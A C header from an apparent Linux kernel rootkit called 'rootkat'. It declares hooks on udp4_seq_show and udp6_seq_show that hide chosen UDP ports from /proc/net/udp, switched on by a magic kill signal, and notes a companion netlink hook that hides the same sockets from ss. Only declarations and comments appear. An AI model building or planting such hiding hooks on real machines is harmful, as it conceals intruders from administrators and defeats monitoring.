/* SPDX-License-Identifier: MIT */
#ifndef ROOTKAT_HOOK_UDP_SEQ_SHOW_H
#define ROOTKAT_HOOK_UDP_SEQ_SHOW_H

/*
 * udp4_seq_show / udp6_seq_show hooks — UDP counterpart of the TCP
 * port-hiding pair. Filters /proc/net/udp{,6} entries whose local port
 * is in the shared hidden_ports registry. Same magic-signal trigger
 * as TCP: kill(<port>, 62).
 *
 * The ss(8) NETLINK_SOCK_DIAG path for UDP is covered separately by
 * hook_inet_sk_diag_fill — that fill function is protocol-agnostic so
 * one hook handles TCP and UDP via netlink. This file only owns the
 * /proc/net/udp{,6} seq_file surface.
 */
int rootkat_hook_udp4_seq_show_install(void);
void rootkat_hook_udp4_seq_show_remove(void);
int rootkat_hook_udp6_seq_show_install(void);
void rootkat_hook_udp6_seq_show_remove(void);

#endif
